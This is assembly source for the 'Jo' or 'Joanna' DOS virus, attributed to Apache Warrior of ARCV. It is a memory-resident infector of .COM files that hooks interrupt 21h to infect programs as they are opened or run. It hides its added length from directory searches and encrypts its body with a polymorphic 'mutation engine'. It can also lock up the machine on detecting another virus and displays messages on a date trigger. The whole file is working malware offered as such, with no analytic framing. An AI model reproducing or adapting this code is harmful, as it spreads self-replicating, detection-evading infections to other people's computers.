        NAME Jo
        PAGE 55,132
        TITLE Jo Virus.

;
; This is Yet another virus from the ARCV, this one is called
; Joanna, it was written by Apache Warrior, ARCV President.
;
; It has Stealth features, it is a Resident infector of .COM files
; and uses the Cybertech Mutation Engine (TM) by Apache Warrior for 
; its Polymorphic features.  There is a maximum of 3 unchanged bytes
; in the Encrypted code.
;

.model tiny

code segment

                ASSUME CS:CODE,DS:CODE,ES:CODE

int_21ofs       equ 84h
int_21seg       equ 86h
length          equ offset handle-offset main
msglen          equ offset oldstart-offset msg
tsrlen          equ (offset findat-offset main)/10  
len             equ offset handle-offset main
virlen          equ (offset string-offset main2)/2
decryptlen      equ offset main2-offset main

                org 100h  

start:          jmp main
                db 0,0,0

main:           mov si,offset main2             ; SI offset for decrypt
                mov cx,virlen                   ; viri decrypt size
loop_1:         
                db 2eh,81h,2ch                  ; decrypt
switch:         dw 0
                add si,02h
                dec cx
                jnz loop_1
main2:          call findoff                    ; find file ofset
findoff:        pop si                          ; 
                sub si,offset findoff
                push ds
                push es
                push cs
                pop ds
                push cs
                pop es
                mov ax,0ff05h                   ; Test for Scythe2 Boot
                int 13h
                cmp ah,0e9h                     ; Check for Scythe2 Boot
                jnz haha                        ; no go on
                mov ah,09h                      ; Display message
                lea dx,[si+offset msg2] 
                int 21h 
                jmp $                           ; Crash the machine
haha:           mov ah,2ah                      ; Date Test
                int 21h                         ;
                cmp dx,1210h                    ; Is month the Oct.
                jnz main3                       ; no go on
                mov ah,09h                      ; Display Message
                lea dx,[si+offset msg] 
                int 21h


main3:          mov di,0100h                    ; move old programs
                push si                         ; start back to the start
                mov ax,offset oldstart          ;
                add si,ax                       ;
                mov cx,05h                      ;
                cld                             ;
                repz movsb                      ;

inst:           mov ax,0ffa4h                   ; check to see if already instaled
                int 21h
                pop si                          ; bring back si
                cmp ax,42a1h
                je oldprog                      ; Yes return to old program

tt2:            xor ax,ax                       ; Residency Routine
                push ax
                mov ax,ds                       ; Get MCB segment Address
                dec ax                          ; 
                mov es,ax                       ; Put MCB segment Address in es
                pop ds                          ; 
                mov ax,word ptr ds:int_21ofs    ; Load Int 21h address data
                mov cx,word ptr ds:int_21seg    ;
                mov word ptr cs:[si+int21],ax   ; Move Int 21h data to store
                mov word ptr cs:[si+int21+2],cx ;
                cmp byte ptr es:[0],5ah         ; Check for Start of MCB
                jne oldprog                     ; If no then quit
                mov ax,es:[3]                   ; Play with MCB to get top of 
                sub ax,0bch                     ; Memory and reserve 3,008 bytes
                jb  oldprog                     ; for Virus
                mov es:[3],ax                   ;
                sub word ptr es:[12h],0bch      ;
                mov es,es:[12h]                 ;
                push ds                         ;
                push cs                         ;
                pop ds                          ; Move Virus into Memory
                mov di,0100h                    ; space allocated above
                mov cx,len+5                    ;
                push si                         ;
                add si,0100h                    ;
                rep movsb                       ;
                pop si
                pop ds
                cli                             ; Stop Interrupts Very Inportant
                mov ax,offset new21             ; Load New Int 21h handler
                mov word ptr ds:int_21ofs,ax    ; address and store
                mov word ptr ds:int_21seg,es    ;
                sti                             ;

oldprog:        
                mov di,0100h                    ; Return to Orginal
                pop es                          ; Program..
                pop ds                          ;
                push di                         ;
                ret                             ;

int21           dd 0h                           ; Storage For Int 21h Address

;
;   New interupt 21h Handler
;

sayitis:        mov ax,42a1h                    ; Install Check..
                iret 

new21:          ;nop                            ; Sign byte 
                cmp ax,0ffa4h                   ; Instalation Check
                je sayitis
                cmp ah,11h                      ; FCB Search file
                je adjust_FCB
                cmp ah,12h                      ; FCB Search Again
                je adjust_FCB
                cmp ah,4eh                      ; Handle Search file
                je adjust_FCB    
                cmp ah,4fh                      ; Handle Search Again
                je adjust_FCB
                cmp ah,3dh                      ; Are they opening a file?
                je intgo                        ; if no ignore
                cmp ah,4bh                      ; Exec Function
                jne noint 
intgo:          push ax                         ; 4bh, 3dh Infect file
                push bx                         ; Handler save the Registers
                push cx
                push es
                push si
                push di
                push dx
                push ds
                call checkit                    ; Call infect routine
                pop ds
                pop dx
                pop di
                pop si
                pop es
                pop cx
                pop bx
                pop ax
noint:          jmp cs:[int21]                  ; Return to Orginal Int 21h

adjust_FCB:     push es                         ; Stealth Routine
                push bx
                push si
                push ax
                xor si,si
                and ah,40h                      ; Check for handle Search
                jz okFCB
                mov si,1                        ; Set flag
okFCB:          mov ah,2fh                      ; Get DTA Address
                int 21h 
                pop ax                          ; Restore ax to orginal function
                call i21                        ; value call it
                pushf                           ; save flags
                push ax                         ; save ax error code
                call adjust                     ; Call stealth adjust routine
                pop ax                          ; restore registers
                popf
                pop si
                pop bx
                pop es
                retf 2                          ; Return to caller

adjust:         pushf                           ; Stealth check routine
                cmp si,0                        ; Check flag set earlyer
                je fcb1
                popf
                jc repurn                       ; Check for Handle Search error
                mov ah,byte ptr es:[bx+16h]     ; No error then carry on
                and ah,01ah                     ; Check stealth stamp
                cmp ah,01ah                     ;
                jne repurn                      ; 
                sub word ptr es:[bx+1ah],len    ; Infected then take the viri size
repurn:         ret                             ; from file size.
fcb1:           popf                            ; Same again but for the FCB
                cmp al,0ffh
                je meat_hook   
                cmp byte ptr es:[bx],0ffh
                jne xx2
                add bx,7
xx2:            mov ah,byte ptr es:[bx+17h]
                and ah,01ah
                cmp ah,01ah
                jne meat_hook
                sub word ptr es:[bx+1dh],len 
meat_hook:      ret  

com_txt db 'COM',0                              ; 

reset:                                          ; File Attrib routines
                mov cx,20h  
set_back:
                mov al,01h
find_att:
                mov ah,43h                      ; Alter file attributes
i21:            pushf
                call cs:[int21]
exitsub:        ret   

checkit:                                        ; Infect routine
                push es                         ; Save some more registers
                push ds
                push ds                         ; Check to see if file is a 
                pop es                          ; .COM file if not then
                push dx                         ; quit..
                pop di                          ;
                mov cx,0ffh                     ; Find '.' in File Name
                mov al,'.'                      ;
                repnz scasb                     ;
                push cs                         ;
                pop ds                          ;
                mov si,offset com_txt           ; Compare with COM extension
                mov cx,3                        ;
                rep cmpsb                       ;
                pop ds                          ; Restore Reg...
                pop es                          ;
                jnz exitsub                     ;

foundtype:      sub di,06h                      ; Check for commaND.com
                cmp ds:[di],'DN'                ; Quit if found..
                je exitsub                      ;
                mov word ptr cs:[nameptr],dx    ; Save DS:DX pointer for later
                mov word ptr cs:[nameptr+2],ds  ;
                mov al,00h                      ; Find Attributes of file to infect
                call find_att                   ;
                jc exitsub                      ; Error Quit.

alteratr:       mov cs:[attrib],cx              ; Save them
                call reset                      ; Reset them to normal

                mov ax,3d02h                    ; Open file
                call i21        
                jc exitsub                      ; Error Quit
                push cs                         ; Set DS to CS
                pop ds                          ;
                mov ds:[handle],ax              ; Store handle

                mov ax,5700h                    ; Read file time and date
                mov bx,ds:[handle]              ;
                call i21                        ;
ke9:            mov ds:[date],dx                ; Save DX
                or cx,1ah                       ; Set Stealth Stamp
                mov ds:[time],cx                ; Save CX
                                                  
                mov ah,3fh                      ; Read in first 5 bytes
                mov cx,05h                      ; To save them
                mov dx,offset oldstart          ;
                call i21                        ;
closeit:        jc close2                       ; Error Quit

                mov ax,4202h                    ; Move filepointer to end
                mov cx,0ffffh                   ; -5 bytes offset from end
                mov dx,0fffbh                   ;
                call i21                        ;
                jc close                        ; Error Quit

                mov word ptr cs:si_val,ax       ; Save File saize for later
                cmp ax,0ea60h                   ; See if too big
                jae close                       ; Yes then Quit

                mov ah,3fh                      ; Read in last 5 bytes
                mov cx,05h                      ; 
                mov dx,offset tempmem           ; 
                call i21                        ; 
                jc close                        ; Error 

                push cs                         ; Reset ES to CS
                pop es                          ;
                mov di,offset tempmem           ; Check if Already infected
                mov si,offset string            ;
                mov cx,5                        ;
                rep cmpsb                       ;
                jz close                        ; Yes the Close and Quit
                                                 
zapfile:                                        ; No Infect and Be Damned
                mov ax,word ptr cs:si_val       ; 
                add ax,2                        ;
                push cs                         ; 
                pop ds                          ; 
                mov word ptr ds:[jpover+1],ax   ; Setup new jump
                call mut_eng                    ; Call Mutation Engine
                mov ah,40h                      ; Save prog to end of file
                mov bx,cs:[handle]              ; Load Handle
                mov cx,length                   ; LENGTH OF PROGRAM****
                call i21                        ; Write away
close2:         jc close                        ; Quit if error

                push cs                         ; Reset DS to CS
                pop ds                          ;      
                mov ax,4200h                    ; Move File pointer to start
                xor cx,cx                       ; of file
                cwd                             ; Clever way to XOR DX,DX
                call i21                        ;
                jc close                        ; Error Quit..
                                                 
                mov ah,40h                      ; Save new start 
                mov cx,03h                      ; 
                mov dx,offset jpover            ;
                call i21                        ;

close:          mov ax,5701h                    ; Restore Time and Date
                mov bx,ds:[handle]              ;
                mov cx,ds:[time]                ;
                mov dx,ds:[date]                ;
                call i21                        ;
                mov ah,3eh                      ; Close file 
                call i21                        ;
exit_sub:       mov dx,word ptr [nameptr]       ; Reset Attributes to as they where
                mov cx,ds:[attrib]              ;
                mov ds,word ptr cs:[nameptr+2]  ;
                call set_back                   ;
                ret                             ; Return to INT 21h Handler


;
;               CyberTech Mutation Engine 
;
;               This is Version Two of the Mutation Engine 
;               Unlike others it is very much Virus Specific..  Works
;               Best on Resident Viruses..
;
;               To Call
;
;               si_val = File Size
;
;               Returns
;               DS:DX = Encrypted Virus Code, Use DS:DX pointer to
;                       Write From..


mut_eng:
                mov ah,2ch                      ; Get Time
                call i21                        ;
                mov word ptr ds:[switch],dx     ; Use Sec./100th counter as key
                mov word ptr ds:[switch2+1],dx  ; Save to Decrypt and Encrypt
                mov ax,cs:[si_val]              ; Get file size
                mov dx,offset main2             ;
                add ax,dx                       ;
                mov word ptr [main+1],ax        ; Store to Decrypt offset
                xor byte ptr [loop_1+2],28h     ; Toggle Add/Sub
                xor byte ptr switch2,28h        ;       "
                push cs                         ; Reset Segment Regs.
                pop ds                          ;
                push cs                         ;
                pop ax                          ; Find Spare Segment
                sub ax,0bch                     ; and put in es
                mov es,ax                       ;
                mov si,offset main              ; Move Decrypt function
                mov di,0100h                    ;
                mov cx,decryptlen               ;
                rep movsb                       ;
                mov si,offset main2             ; Start the code encrypt
                mov cx,virlen                   ;
loop_10:        lodsw                           ;
switch2:        add ax,0000                     ;
                stosw                           ;
                loop loop_10                    ;
                mov si,offset string            ; move ID string to end
                mov cx,5                        ; new code
                rep movsb                       ;
                mov dx,0100h                    ; Set Registers to encrypted Virus
                push es                         ; Location
                pop ds                          ;
                ret                             ; Return

; Data Section, contains Messages etc.


;               Little message to the Wife to Be..

msg             db 'Looking Good Slimline Joanna.',0dh,0ah
                db 'Made in England by Apache Warrior, ARCV Pres.',0dh,0ah,0ah 
                db 'Jo Ver. 1.11 (c) Apache Warrior 92.',0dh,0ah
                db '$'

msg2            db 'I Love You Joanna, Apache..',0dh,0ah,'$'

virus_name      db '[JO]',00h,                          ; Virus Name..
author          db 'By Apache Warrior, ARCV Pres.'      ; Thats me..
filler          dd 0h

oldstart:       mov ax,4c00h                    ; Orginal program start
                int 21h
                nop
                nop

j100h           dd 0100h                        ; Stores for jumps etc
jpover          db 0e9h,00,00h                  ;

string          db '65fd3'                      ; ID String 

:heap                                           ; This code is not saved 
handle          dw 0h
nameptr         dd 0h
attrib          dw 0h
date            dw 0h
time            dw 0h
tempmem         db 10h dup (?)
findat          db 0h
si_val          dw 0h

code ends

end start